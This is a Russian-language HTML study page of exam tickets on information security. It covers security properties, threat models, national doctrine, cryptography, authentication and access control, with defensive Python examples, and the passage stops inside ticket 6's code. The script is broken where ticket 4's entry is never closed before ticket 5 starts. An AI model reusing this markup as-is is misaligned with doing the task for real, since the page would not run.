<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Экзаменационные билеты — ИБ и искусственный интеллект</title>
<style>
:root{
  --paper:#FBFAF6;
  --paper2:#F0EDE4;
  --line:#DBD5C6;
  --ink:#191821;
  --ink2:#55525F;
  --blue:#1F6257;
  --blue-soft:#E1EDE9;
  --stamp:#A0342C;
  --olive:#6B5330;
  --code-bg:#F4F2EC;
  --shadow:0 1px 0 rgba(25,24,33,.06), 0 8px 24px -18px rgba(25,24,33,.5);
  --serif:"Iowan Old Style","Palatino Linotype",Palatino,Georgia,"Times New Roman",serif;
  --sans:ui-sans-serif,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  --mono:ui-monospace,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
}
html[data-theme="dark"]{
  --paper:#14141A;
  --paper2:#1C1C24;
  --line:#31313D;
  --ink:#E8E6E0;
  --ink2:#9A98A4;
  --blue:#79CFBB;
  --blue-soft:#1B2E2A;
  --stamp:#E08279;
  --olive:#C9A96B;
  --code-bg:#1A1A22;
  --shadow:0 1px 0 rgba(0,0,0,.4), 0 8px 24px -18px #000;
}
*{box-sizing:border-box}
html,body{margin:0;padding:0}
body{
  background:var(--paper);
  color:var(--ink);
  font-family:var(--serif);
  font-size:17px;
  line-height:1.62;
  -webkit-text-size-adjust:100%;
}

/* ---------- Шапка ---------- */
header{
  position:sticky;top:0;z-index:50;
  background:color-mix(in srgb, var(--paper) 92%, transparent);
  backdrop-filter:blur(10px);
  border-bottom:1px solid var(--line);
}
.bar{max-width:1240px;margin:0 auto;padding:10px 20px;display:flex;gap:14px;align-items:center;flex-wrap:wrap}
.brand{display:flex;flex-direction:column;line-height:1.1;margin-right:auto}
.brand b{font-size:19px;letter-spacing:.2px;font-weight:600}
.brand span{font-family:var(--sans);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--ink2)}
.blocks{display:flex;background:var(--paper2);border:1px solid var(--line);border-radius:999px;padding:3px}
.blocks button{
  font-family:var(--sans);font-size:13px;font-weight:600;
  border:0;background:transparent;color:var(--ink2);
  padding:7px 15px;border-radius:999px;cursor:pointer;white-space:nowrap;
}
.blocks button[aria-selected="true"]{background:var(--paper);color:var(--ink);box-shadow:var(--shadow)}
#q{
  font-family:var(--sans);font-size:14px;
  border:1px solid var(--line);background:var(--paper2);color:var(--ink);
  border-radius:999px;padding:8px 15px;width:210px;outline:0;
}
#q:focus{border-color:var(--blue);box-shadow:0 0 0 3px var(--blue-soft)}
.icons{display:flex;gap:6px}
.icons button{
  font-family:var(--sans);font-size:13px;font-weight:600;cursor:pointer;
  border:1px solid var(--line);background:var(--paper2);color:var(--ink2);
  border-radius:9px;padding:8px 11px;
}
.icons button:hover{color:var(--ink);border-color:var(--ink2)}
.progress{height:2px;background:var(--line)}
.progress i{display:block;height:100%;width:0;background:var(--blue);transition:width .3s ease}

/* ---------- Раскладка ---------- */
.wrap{max-width:1240px;margin:0 auto;padding:22px 20px 80px;display:grid;grid-template-columns:270px 1fr;gap:34px;align-items:start}
nav{position:sticky;top:78px;max-height:calc(100vh - 100px);overflow:auto;padding-right:6px}
.navhead{font-family:var(--sans);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--ink2);margin:0 0 10px;display:flex;justify-content:space-between}
.tickets{display:flex;flex-direction:column;gap:4px}
.tk{
  display:flex;gap:11px;align-items:flex-start;text-align:left;width:100%;
  border:1px solid transparent;background:transparent;color:var(--ink);
  border-radius:10px;padding:8px 10px;cursor:pointer;font-family:var(--sans);font-size:13.5px;line-height:1.35;
}
.tk:hover{background:var(--paper2)}
.tk .num{
  flex:0 0 26px;height:26px;border-radius:50%;border:1px solid var(--line);
  display:grid;place-items:center;font-size:12px;font-weight:700;color:var(--ink2);background:var(--paper);
}
.tk[aria-current="true"]{background:var(--blue-soft);border-color:color-mix(in srgb,var(--blue) 30%,transparent)}
.tk[aria-current="true"] .num{border-color:var(--blue);color:var(--blue)}
.tk.done .num{background:var(--blue);border-color:var(--blue);color:#fff}
.tk.done .num::after{content:"✓"}
.tk.done .num span{display:none}

/* ---------- Карточка билета ---------- */
main{min-width:0}
article{
  background:var(--paper);border:1px solid var(--line);border-radius:14px;
  padding:34px 38px 40px;box-shadow:var(--shadow);position:relative;overflow:hidden;
}
article::before{content:"";position:absolute;left:0;top:0;bottom:0;width:5px;background:var(--blue);opacity:.85}
.stamp{
  position:absolute;right:26px;top:22px;
  width:78px;height:78px;border:2px solid var(--stamp);border-radius:50%;
  display:grid;place-items:center;transform:rotate(-9deg);opacity:.5;pointer-events:none;
}
.stamp b{font-family:var(--sans);font-size:26px;color:var(--stamp);line-height:1}
.stamp i{position:absolute;bottom:11px;font-family:var(--sans);font-style:normal;font-size:7.5px;letter-spacing:.12em;color:var(--stamp)}
.eyebrow{font-family:var(--sans);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--ink2);margin:0 0 6px}
h1{font-size:29px;line-height:1.22;margin:0 0 4px;font-weight:600;max-width:min(100%,42ch);letter-spacing:-.01em}
.src{font-family:var(--sans);font-size:12.5px;color:var(--ink2);margin:0 0 22px}
article h3{font-size:14px;font-family:var(--sans);letter-spacing:.06em;text-transform:uppercase;color:var(--blue);margin:30px 0 10px;font-weight:700}
article h4{font-size:17px;margin:22px 0 6px;font-weight:600}
article p{margin:0 0 11px}
article ul,article ol{margin:0 0 12px;padding-left:22px}
article li{margin:0 0 5px}
b,strong{font-weight:600}
.f{
  font-family:var(--serif);font-size:17.5px;background:var(--paper2);
  border-left:3px solid var(--line);border-radius:0 8px 8px 0;
  padding:9px 15px;margin:10px 0;overflow-x:auto;white-space:nowrap;
}
.def,.thm,.note{border:1px solid var(--line);border-radius:10px;padding:12px 16px;margin:12px 0;background:var(--paper2)}
.def{border-left:3px solid var(--blue)}
.thm{border-left:3px solid var(--olive)}
.note{border-left:3px solid var(--stamp)}
.def b:first-child,.thm b:first-child,.note b:first-child{font-family:var(--sans);font-size:12px;letter-spacing:.1em;text-transform:uppercase}
.def b:first-child{color:var(--blue)}
.thm b:first-child{color:var(--olive)}
.note b:first-child{color:var(--stamp)}
pre{background:var(--code-bg);border:1px solid var(--line);border-radius:10px;padding:14px 16px;overflow-x:auto;margin:12px 0}
code{font-family:var(--mono);font-size:13.5px;line-height:1.55}
p code,li code,td code{background:var(--paper2);border:1px solid var(--line);border-radius:5px;padding:.5px 5px;font-size:13px}
table{border-collapse:collapse;width:100%;margin:12px 0;font-family:var(--sans);font-size:14px}
th,td{border:1px solid var(--line);padding:7px 11px;text-align:left;vertical-align:top}
th{background:var(--paper2);font-weight:600;font-size:12.5px;letter-spacing:.03em}
.kv{font-family:var(--mono);font-size:13px}
.foot{display:flex;gap:10px;align-items:center;margin-top:30px;padding-top:20px;border-top:1px solid var(--line);flex-wrap:wrap}
.foot button{font-family:var(--sans);font-size:13.5px;font-weight:600;cursor:pointer;border:1px solid var(--line);background:var(--paper2);color:var(--ink);border-radius:9px;padding:9px 15px}
.foot button:hover{border-color:var(--ink2)}
.foot .mark{margin-left:auto;border-color:var(--blue);color:var(--blue)}
.foot .mark.on{background:var(--blue);color:#fff}
.empty{font-family:var(--sans);color:var(--ink2);padding:40px 0;text-align:center}
:focus-visible{outline:2px solid var(--blue);outline-offset:2px}
::selection{background:var(--blue-soft)}

@media (max-width:900px){
  .wrap{grid-template-columns:1fr;gap:16px;padding:14px 12px 60px}
  nav{position:static;max-height:none}
  .tickets{flex-direction:row;flex-wrap:wrap;gap:6px}
  .tk{width:auto;padding:6px 9px}
  .tk .lbl{display:none}
  article{padding:24px 18px 30px;border-radius:12px}
  h1{font-size:23px}
  .stamp{display:none}
  #q{width:100%;order:9}
  .brand{margin-right:0}
}
@media print{
  header,nav,.foot,.stamp{display:none}
  .wrap{display:block;max-width:none;padding:0}
  article{border:0;box-shadow:none;padding:0}
  body{font-size:11pt}
}
@media (prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
</style>
</head>
<body>

<header>
  <div class="bar">
    <div class="brand"><b>Экзаменационные билеты</b><span>Информационная безопасность · Искусственный интеллект</span></div>
    <div class="blocks" role="tablist">
      <button role="tab" id="b1" aria-selected="true">Блок 1 · Безопасность</button>
      <button role="tab" id="b2" aria-selected="false">Блок 2 · ИИ и данные</button>
    </div>
    <input id="q" type="search" placeholder="Поиск по билетам…" autocomplete="off">
    <div class="icons">
      <button id="theme" title="Сменить тему">◐</button>
      <button id="print" title="Печать / PDF">⎙</button>
    </div>
  </div>
  <div class="progress"><i id="pbar"></i></div>
</header>

<div class="wrap">
  <nav>
    <div class="navhead"><span id="navtitle">Блок 1 · Защита информации</span><span id="navcount"></span></div>
    <div class="tickets" id="list"></div>
  </nav>
  <main id="main"></main>
</div>

<script>
const T = [];

/* ==================== БЛОК 1 — ЗАЩИТА ИНФОРМАЦИИ ==================== */

T.push({b:1,n:1,t:"Информационная безопасность и защита информации. Цели и современные задачи",
s:"ГОСТ Р 50922-2006, ФЗ-149, ISO/IEC 27000",
h:`
<h3>Определения</h3>
<div class="def"><b>Информационная безопасность</b> — состояние защищённости информации и поддерживающей инфраструктуры, при котором обеспечиваются её конфиденциальность, целостность и доступность, а также защищённость интересов личности, общества и государства в информационной сфере.</div>
<div class="def"><b>Защита информации</b> (ГОСТ Р 50922-2006) — деятельность, направленная на предотвращение утечки защищаемой информации, несанкционированных и непреднамеренных воздействий на неё. ИБ — это <b>состояние</b>, защита информации — <b>деятельность</b> по его достижению.</div>
<p><b>Информация</b> (ФЗ-149 «Об информации, информационных технологиях и о защите информации») — сведения (сообщения, данные) независимо от формы их представления.</p>

<h3>Свойства информации (триада CIA и расширения)</h3>
<table>
<tr><th>Свойство</th><th>Смысл</th><th>Пример нарушения</th></tr>
<tr><td><b>Конфиденциальность</b></td><td>доступ только для уполномоченных</td><td>утечка базы клиентов</td></tr>
<tr><td><b>Целостность</b></td><td>неизменность и достоверность</td><td>подмена суммы платежа</td></tr>
<tr><td><b>Доступность</b></td><td>доступ по требованию в приемлемое время</td><td>DDoS-атака, отказ сервиса</td></tr>
<tr><td>Аутентичность</td><td>подлинность источника</td><td>фишинговый сайт-двойник</td></tr>
<tr><td>Неотказуемость</td><td>невозможность отрицать авторство</td><td>отказ от подписанной сделки</td></tr>
<tr><td>Подотчётность</td><td>прослеживаемость действий субъекта</td><td>удаление журналов аудита</td></tr>
</table>

<h3>Цели защиты информации</h3>
<p>По ФЗ-149 (ст. 16) защита информации представляет собой принятие мер, направленных на:</p>
<ul>
<li>предотвращение неправомерного доступа, уничтожения, модифицирования, блокирования, копирования, предоставления, распространения информации;</li>
<li>соблюдение конфиденциальности информации ограниченного доступа;</li>
<li>реализацию права на доступ к информации;</li>
<li>предотвращение утечки по техническим каналам и специальных воздействий.</li>
</ul>
<p>С точки зрения организации цель — <b>снижение рисков до приемлемого уровня</b> при разумных затратах: стоимость защиты не должна превышать стоимость защищаемого актива.</p>

<h3>Современные задачи</h3>
<ul>
<li><b>Защита облачных и гибридных сред</b>, контейнеров и микросервисов; модель разделённой ответственности.</li>
<li><b>Zero Trust</b>: отказ от доверия по периметру, проверка каждого запроса («никогда не доверяй, всегда проверяй»), микросегментация.</li>
<li><b>Безопасность цепочек поставок ПО</b> (supply chain): зависимости, SBOM, подпись артефактов, атаки типа SolarWinds.</li>
<li><b>Защита персональных данных</b> (152-ФЗ, GDPR) и критической информационной инфраструктуры (187-ФЗ, ГосСОПКА).</li>
<li><b>Безопасность ИИ-систем</b>: состязательные атаки, отравление обучающих данных, кража модели, инъекции в промпт, защита обучающих выборок.</li>
<li><b>Импортозамещение и доверенные решения</b>, отечественная криптография, сертифицированные СЗИ.</li>
<li><b>DevSecOps</b>: перенос контроля безопасности на ранние стадии разработки (shift left), SAST/DAST/SCA в CI/CD.</li>
<li>Дефицит кадров, рост стоимости инцидентов, шифровальщики и модель «вымогательство как услуга».</li>
</ul>
<div class="note"><b>Три уровня мер:</b> организационно-правовые (политики, регламенты, договоры, обучение), инженерно-технические (криптография, СЗИ от НСД, антивирусы, межсетевые экраны) и физические (контроль доступа в помещения, охрана). Только их сочетание даёт результат: безопасность определяется самым слабым звеном.</div>
`});

T.push({b:1,n:2,t:"Угрозы и риски. Описание и классификация угроз",
s:"Методика оценки угроз ФСТЭК 2021, БДУ ФСТЭК, ISO/IEC 27005",
h:`
<h3>Основные понятия</h3>
<div class="def"><b>Угроза безопасности информации</b> — совокупность условий и факторов, создающих потенциальную или реально существующую опасность нарушения безопасности информации. <b>Уязвимость</b> — недостаток системы, который может быть использован для реализации угрозы. <b>Атака</b> — реализация угрозы. <b>Риск</b> — сочетание вероятности реализации угрозы и тяжести последствий.</div>
<div class="f">Риск ≈ Вероятность реализации угрозы × Величина ущерба</div>
<p>Угроза реализуема только при наличии трёх компонентов одновременно: <b>источник угрозы</b> + <b>уязвимость</b> + <b>способ реализации</b>. Разрыв любого звена нейтрализует угрозу.</p>

<h3>Элементы описания угрозы</h3>
<table>
<tr><th>Элемент</th><th>Содержание</th></tr>
<tr><td>Источник (нарушитель)</td><td>вид, потенциал, мотивация, возможности</td></tr>
<tr><td>Объект воздействия</td><td>актив: информация, ПО, оборудование, канал связи, персонал</td></tr>
<tr><td>Уязвимость</td><td>недостаток кода, конфигурации, архитектуры, организационных мер</td></tr>
<tr><td>Способ (сценарий) реализации</td><td>тактики и техники нарушителя (аналог матрицы MITRE ATT&amp;CK)</td></tr>
<tr><td>Последствия</td><td>какое свойство нарушается (К/Ц/Д) и какой ущерб наступает</td></tr>
</table>
<p>В формате БДУ ФСТЭК: <span class="kv">УБИ.xxx = [источник] + [объект] + [последствия]</span>. Итоговая формулировка: «нарушитель с низким потенциалом, используя уязвимость веб-приложения, получает несанкционированный доступ к базе персональных данных, что нарушает конфиденциальность».</p>

<h3>Классификация угроз</h3>
<table>
<tr><th>Признак</th><th>Виды</th></tr>
<tr><td>По природе</td><td>антропогенные (человек), техногенные (сбои техники), стихийные (пожар, наводнение)</td></tr>
<tr><td>По преднамеренности</td><td>умышленные и непреднамеренные (ошибки персонала — до половины инцидентов)</td></tr>
<tr><td>По расположению источника</td><td>внешние и внутренние (инсайдеры — наиболее опасны из-за легитимного доступа)</td></tr>
<tr><td>По нарушаемому свойству</td><td>угрозы конфиденциальности, целостности, доступности</td></tr>
<tr><td>По способу реализации</td><td>программные, аппаратные, технические каналы утечки (ПЭМИН, акустический, оптический), социальная инженерия</td></tr>
<tr><td>По этапу жизненного цикла</td><td>при разработке, эксплуатации, выводе из эксплуатации</td></tr>
</table>

<h3>Оценка и обработка рисков</h3>
<p><b>Этапы (методика ФСТЭК 2021):</b> определение негативных последствий → инвентаризация объектов воздействия → определение источников и оценка возможностей нарушителей → оценка способов реализации → определение актуальности угроз → построение сценариев атак.</p>
<p><b>Модели угроз в разработке:</b> STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege); оценка критичности уязвимостей по CVSS (базовые, временные, контекстные метрики, оценка 0–10).</p>
<p><b>Способы обработки риска:</b> снижение (внедрение мер защиты), передача (страхование, аутсорсинг), принятие (осознанное, если ущерб мал), избежание (отказ от рискованного процесса).</p>
<div class="note"><b>Актуальная угроза</b> — та, для которой существует нарушитель с достаточным потенциалом, есть сценарий реализации и последствия неприемлемы. Именно перечень актуальных угроз определяет состав мер защиты в конкретной системе.</div>
`});

T.push({b:1,n:3,t:"Доктрина информационной безопасности РФ. Стратегия национальной безопасности",
s:"Указ Президента РФ №646 от 05.12.2016; Указ №400 от 02.07.2021",
h:`
<h3>Доктрина информационной безопасности РФ</h3>
<p>Утверждена Указом Президента РФ №646 от 5 декабря 2016 г. (заменила Доктрину 2000 г.). Это документ <b>стратегического планирования</b>, представляющий официальные взгляды на обеспечение национальной безопасности в информационной сфере.</p>
<p><b>Информационная сфера</b> — совокупность информации, объектов информатизации, информационных систем, сайтов в сети Интернет, сетей связи, информационных технологий, субъектов деятельности и механизмов регулирования соответствующих отношений.</p>

<h4>Национальные интересы в информационной сфере</h4>
<ul>
<li>обеспечение и защита конституционных прав и свобод человека в части получения и использования информации, неприкосновенности частной жизни;</li>
<li>бесперебойное функционирование критической информационной инфраструктуры (КИИ) и единой сети электросвязи;</li>
<li>развитие в России отрасли информационных технологий и электронной промышленности;</li>
<li>доведение достоверной информации о государственной политике России до российской и международной аудитории;</li>
<li>содействие формированию системы международной информационной безопасности.</li>
</ul>

<h4>Основные информационные угрозы</h4>
<ul>
<li>наращивание рядом государств возможностей информационно-технического воздействия на информационную инфраструктуру в военных целях;</li>
<li>усиление деятельности организаций, осуществляющих техническую разведку;</li>
<li>информационно-психологическое воздействие, размывание традиционных ценностей, распространение экстремистской идеологии;</li>
<li>рост компьютерной преступности в кредитно-финансовой сфере;</li>
<li>отставание в развитии конкурентоспособных информационных технологий, зависимость от зарубежной продукции;</li>
<li>недостаточная эффективность научных исследований и дефицит кадров.</li>
</ul>

<h4>Стратегические цели и направления</h4>
<p>Цели: в области <b>обороны</b> — защита интересов при сдерживании агрессии в информационной сфере; в области <b>государственной и общественной безопасности</b> — защита суверенитета, стабильность, защита КИИ; в <b>экономической</b> сфере — сокращение зависимости от зарубежных технологий; в области <b>науки и образования</b> — инновационное развитие и подготовка кадров; в области <b>стратегической стабильности</b> — формирование устойчивой системы неконфликтных межгосударственных отношений.</p>

<h3>Стратегия национальной безопасности РФ</h3>
<p>Утверждена Указом Президента РФ №400 от 2 июля 2021 г. Определяет национальные интересы, стратегические национальные приоритеты, цели и меры внутренней и внешней политики.</p>
<p><b>Информационная безопасность</b> выделена как один из стратегических национальных приоритетов наряду со сбережением народа, обороной страны, государственной и общественной безопасностью, экономической, научно-технологической, экологической безопасностью, защитой традиционных ценностей и стратегической стабильностью.</p>
<p><b>Ключевые задачи в части ИБ:</b> обеспечение устойчивости и безопасности функционирования информационной инфраструктуры (в том числе российского сегмента сети Интернет); предотвращение деструктивного информационно-психологического воздействия; развитие отечественных технологий и защищённых программно-аппаратных средств; локализация обработки и хранения данных граждан РФ на территории страны; повышение защищённости КИИ и противодействие компьютерным атакам.</p>
<div class="note"><b>Правовая рамка.</b> Доктрина и Стратегия — концептуальные документы, не содержащие прямых технических требований. Они реализуются через законы (149-ФЗ, 152-ФЗ, 187-ФЗ), приказы ФСТЭК и ФСБ (в том числе приказы №17, №21, №239), национальные стандарты и государственные программы («Цифровая экономика»).</div>
`});

T.push({b:1,n:4,t:"Криптографические методы: секретность, подлинность, целостность, неотказуемость",
s:"63-ФЗ «Об электронной подписи»; ГОСТ 34.10-2012, 34.11-2018, 34.12-2018",
h:`
<h3>Какая задача какими средствами решается</h3>
<table>
<tr><th>Свойство</th><th>Криптографический механизм</th><th>Примеры алгоритмов</th></tr>
<tr><td><b>Секретность</b> (конфиденциальность)</td><td>шифрование симметричное и асимметричное</td><td>ГОСТ 34.12-2018 «Кузнечик» и «Магма», AES; RSA-OAEP, ECIES</td></tr>
<tr><td><b>Целостность</b></td><td>криптографические хеш-функции, имитовставка (MAC/HMAC)</td><td>ГОСТ 34.11-2018 «Стрибог», SHA-256, HMAC, CMAC</td></tr>
<tr><td><b>Подлинность</b> (аутентичность)</td><td>MAC, протоколы аутентификации «запрос — ответ», сертификаты</td><td>HMAC, Kerberos, TLS-handshake, X.509</td></tr>
<tr><td><b>Неотказуемость</b></td><td>электронная подпись на асимметричном ключе + PKI + метка времени</td><td>ГОСТ Р 34.10-2012, ECDSA, Ed25519, RFC 3161 (TSA)</td></tr>
</table>
<div class="note"><b>Ключевое различие.</b> MAC обеспечивает целостность и подлинность, но <b>не</b> неотказуемость: ключ симметричный и известен обеим сторонам, поэтому получатель мог подделать сообщение сам. Неотказуемость даёт только подпись закрытым ключом, который есть исключительно у подписанта.</div>

<h3>Порядок использования</h3>
<ul>
<li><b>Шифрование.</b> Симметричные алгоритмы — для больших объёмов (быстрые), асимметричные — для передачи сеансового ключа и подписи. Отсюда гибридные схемы (TLS, PGP). Режимы работы блочных шифров: CTR, CBC, и режимы аутентифицированного шифрования GCM, MGM — предпочтительны, так как дают конфиденциальность и целостность одновременно.</li>
<li><b>Управление ключами</b> — самое уязвимое место: генерация на качественном источнике случайности, безопасное хранение (HSM, смарт-карта, токен), распределение (Диффи — Хеллман, PKI), плановая смена, уничтожение, разделение секрета.</li>
<li><b>Электронная подпись</b> по 63-ФЗ: простая ЭП; усиленная неквалифицированная; <b>усиленная квалифицированная</b> (создаётся сертифицированными СКЗИ, сертификат выдаёт аккредитованный удостоверяющий центр) — равнозначна собственноручной подписи. Проверка подписи включает проверку цепочки сертификатов и статуса отзыва (CRL/OCSP), а метка времени доверенной третьей стороны фиксирует момент подписания.</li>
<li><b>Нормативные требования.</b> Разработка и распространение СКЗИ лицензируются ФСБ России; для защиты информации ограниченного доступа применяются сертифицированные средства классов КС1 — КА1, класс выбирается по модели нарушителя.</li>
</ul>

<h3>Схема применения</h3>
<div class="f">Отправитель: C = E<sub>k</sub>(M), k шифруется открытым ключом получателя; подпись S = Sign<sub>d</sub>(H(M))</div>
<div class="f">Получатель: восстанавливает k, M = D<sub>k</sub>(C), проверяет Verify<sub>e</sub>(H(M), S)</div>

<h3>Код</h3>
<pre><code>import os, hmac, hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import ec, padding
from cryptography.hazmat.primitives import hashes

msg = b"summa=1000; schet=40817..."

# 1) СЕКРЕТНОСТЬ + ЦЕЛОСТНОСТЬ: аутентифицированное шифрование
key = AESGCM.generate_key(bit_length=256)
nonce = os.urandom(12)                       # уникален для каждого сообщения
ct = AESGCM(key).encrypt(nonce, msg, b"header")
print(AESGCM(key).decrypt(nonce, ct, b"header") == msg)

# 2) ЦЕЛОСТНОСТЬ: хеш и имитовставка
print(hashlib.sha256(msg).hexdigest()[:16])
mac = hmac.new(b"shared-key", msg, hashlib.sha256).digest()
print(hmac.compare_digest(mac, hmac.new(b"shared-key", msg, hashlib.sha256).digest()))

# 3) НЕОТКАЗУЕМОСТЬ: электронная подпись на закрытом ключе
priv = ec.generate_private_key(ec.SECP256R1())
pub = priv.public_key()
sig = priv.sign(msg, ec.ECDSA(hashes.SHA256()))
try:
    pub.verify(sig, msg, ec.ECDSA(hashes.SHA256()))
    print("подпись верна: автор не может отказаться от авторства")
except Exception:
    print("подпись недействительна")

# отечественная криптография - библиотека pygost / сертифицированные СКЗИ
# from pygost.gost34112012256 import GOST34112012256</code></pre>

T.push({b:1,n:5,t:"Идентификация и аутентификация",
s:"ГОСТ Р 58833-2020, NIST SP 800-63",
h:`
<h3>Понятия</h3>
<div class="def"><b>Идентификация</b> — присвоение субъекту или объекту идентификатора и его предъявление («кто ты»). <b>Аутентификация</b> — проверка принадлежности предъявленного идентификатора субъекту, подтверждение подлинности («докажи»). <b>Авторизация</b> — предоставление прав доступа («что тебе можно»). Это три последовательных, но разных процесса.</div>

<h3>Факторы аутентификации</h3>
<table>
<tr><th>Фактор</th><th>Примеры</th><th>Уязвимости</th></tr>
<tr><td><b>Знание</b> (что знаю)</td><td>пароль, PIN, ответ на секретный вопрос</td><td>перебор, словарные атаки, фишинг, подсматривание</td></tr>
<tr><td><b>Владение</b> (что имею)</td><td>смарт-карта, USB-токен, OTP-генератор, телефон</td><td>кража, клонирование, перехват SMS (SIM swap)</td></tr>
<tr><td><b>Биометрия</b> (кто я)</td><td>отпечаток, лицо, радужка, голос, клавиатурный почерк</td><td>подделка образца, невозможность смены «пароля»</td></tr>
</table>
<p><b>Многофакторная аутентификация (MFA)</b> — сочетание факторов <b>разных</b> категорий (пароль + одноразовый код). Дополнительные признаки: местоположение, устройство, поведение (адаптивная и риск-ориентированная аутентификация).</p>

<h3>Методы и протоколы</h3>
<ul>
<li><b>Парольная.</b> Хранить только хеш с уникальной солью и медленной функцией (Argon2, bcrypt, scrypt, PBKDF2), никогда не открытым текстом и не «быстрым» хешем. Меры: ограничение попыток, задержки, проверка по спискам скомпрометированных паролей.</li>
<li><b>«Запрос — ответ» (challenge-response).</b> Сервер присылает случайный запрос, клиент отвечает функцией от секрета — сам секрет по каналу не передаётся, что защищает от повторного воспроизведения (replay).</li>
<li><b>Одноразовые пароли:</b> HOTP (по счётчику) и TOTP (по времени, RFC 6238) — код от общего секрета и текущего временного окна.</li>
<li><b>Криптографическая:</b> сертификаты X.509 и взаимный TLS, электронная подпись, FIDO2/WebAuthn (аппаратный ключ, привязка к домену — устойчивость к фишингу), беспарольный вход по passkey.</li>
<li><b>Централизованная:</b> Kerberos (билеты, доверенный центр KDC), RADIUS/TACACS+, LDAP; федеративная — SAML, OpenID Connect поверх OAuth 2.0, единый вход SSO.</li>
</ul>
<div class="note"><b>Важно.</b> OAuth 2.0 — протокол <b>авторизации</b> (делегирование доступа к ресурсу), а не аутентификации; для аутентификации поверх него используется OpenID Connect с id_token.</div>

<h3>Показатели качества биометрии</h3>
<p><b>FAR</b> — вероятность ложного допуска чужого; <b>FRR</b> — вероятность ложного отказа своему; <b>EER</b> — точка равенства ошибок, чем ниже, тем лучше система. Настройка порога — компромисс между безопасностью и удобством.</p>

<h3>Код</h3>
<pre><code>import hmac, hashlib, time, base64, struct, os

# 1) Правильное хранение пароля: соль + медленная функция
salt = os.urandom(16)
digest = hashlib.pbkdf2_hmac('sha256', b'Passw0rd!', salt, 600_000)
def verify(pwd, salt, digest):
    return hmac.compare_digest(
        hashlib.pbkdf2_hmac('sha256', pwd, salt, 600_000), digest)   # сравнение за const time
print(verify(b'Passw0rd!', salt, digest), verify(b'wrong', salt, digest))
# в проде: argon2-cffi -> PasswordHasher().hash(pwd) / .verify(hash, pwd)

# 2) TOTP - второй фактор (RFC 6238)
def totp(secret_b32, step=30, digits=6):
    key = base64.b32decode(secret_b32, casefold=True)
    counter = struct.pack('&gt;Q', int(time.time()) // step)
    h = hmac.new(key, counter, hashlib.sha1).digest()
    o = h[-1] &amp; 0x0F
    code = (struct.unpack('&gt;I', h[o:o+4])[0] &amp; 0x7FFFFFFF) % (10 ** digits)
    return str(code).zfill(digits)
print(totp('JBSWY3DPEHPK3PXP'))

# 3) Challenge-response: секрет не передаётся по каналу
challenge = os.urandom(16)                          # сервер -> клиент
response = hmac.new(b'shared-secret', challenge, hashlib.sha256).digest()
expected = hmac.new(b'shared-secret', challenge, hashlib.sha256).digest()
print(hmac.compare_digest(response, expected))</code></pre>
`});

T.push({b:1,n:6,t:"Контроль и разграничение доступа. Модели и системы",
s:"Bell — LaPadula, Biba, RBAC (INCITS 359), ABAC (XACML)",
h:`
<h3>Базовая модель</h3>
<p><b>Субъект</b> (пользователь, процесс) — <b>объект</b> (файл, таблица, сервис) — <b>право доступа</b> (чтение, запись, исполнение, удаление). Формальное описание — <b>матрица доступа</b> (модель Харрисона — Руззо — Ульмана): строки — субъекты, столбцы — объекты, в ячейках — права. Хранится в двух вариантах: по столбцам — <b>ACL</b> (список контроля доступа при объекте), по строкам — <b>списки возможностей</b> (capabilities, мандаты у субъекта).</p>
<p><b>Принципы:</b> минимум привилегий (least privilege), необходимость знать (need to know), разделение обязанностей (separation of duties), запрет по умолчанию (deny by default), полное посредничество (каждое обращение проверяется).</p>

<h3>Модели разграничения доступа</h3>
<table>
<tr><th>Модель</th><th>Принцип</th><th>Плюсы и минусы</th></tr>
<tr><td><b>DAC</b> — дискреционное</td><td>владелец объекта сам назначает права</td><td>гибко и просто; уязвимо к «троянам» и утечке прав по цепочке</td></tr>
<tr><td><b>MAC</b> — мандатное</td><td>метки конфиденциальности объектов и допуски субъектов, правила задаёт система</td><td>строго, применяется при гостайне; негибко и трудоёмко</td></tr>
<tr><td><b>RBAC</b> — ролевое</td><td>права назначаются ролям, роли — пользователям</td><td>стандарт де-факто в корпоративных системах; риск «разрастания ролей»</td></tr>
<tr><td><b>ABAC</b> — атрибутное</td><td>решение вычисляется по атрибутам субъекта, объекта, действия и среды</td><td>максимально гибко (время, геолокация, устройство); сложнее в отладке</td></tr>
</table>
<div class="thm"><b>Модель Белла — ЛаПадулы</b> (конфиденциальность): «нет чтения вверх» (субъект не читает объект более высокого уровня) и «нет записи вниз» (не записывает на более низкий уровень, чтобы не рассекретить). <b>Модель Биба</b> (целостность) — двойственная: «нет чтения снизу», «нет записи вверх». Модель Кларка — Вилсона ориентирована на корректность бизнес-транзакций, модель «китайской стены» — на конфликт интересов.</div>

<h3>Архитектура системы контроля доступа</h3>
<p>Стандартная схема (XACML): <b>PEP</b> (точка применения решения) перехватывает запрос → <b>PDP</b> (точка принятия решения) вычисляет вердикт по политике → <b>PIP</b> (источник атрибутов) поставляет данные → <b>PAP</b> (точка администрирования) управляет политиками. Решение: permit / deny, всё фиксируется в журнале аудита.</p>
<p><b>Практические реализации:</b> права файловой системы и ACL в ОС, SELinux и AppArmor (мандатный контроль в Linux), Active Directory и групповые политики, IAM в облаках, СКУД для физического доступа, сетевая сегментация и межсетевые экраны, СЗИ от НСД (Secret Net, Dallas Lock).</p>

<h3>Код</h3>
<pre><code>from enum import Enum
from datetime import datetime

# --- RBAC ---
ROLE_PERMS = {
    'analyst': {'report:read'},
    'manager': {'report:read', 'report:approve'},
    'admin':   {'report:read', 'report:approve', 'user:manage'},
}
def can(user_roles, perm):
    return any(perm in ROLE_PERMS.get(r, set()) for r in user_roles)

print(can(['analyst'], 'report:approve'), can(['manager'], 'report:approve'))

# --- ABAC: решение по атрибутам субъекта, объекта и среды ---
def pdp(subject, resource, action, env):
    if resource['owner'] == subject['id']:                       return True
    if action == 'read' and subject['dept'] == resource['dept']: return True
    if subject['clearance'] &lt; resource['level']:                 return False   # Белл-ЛаПадула
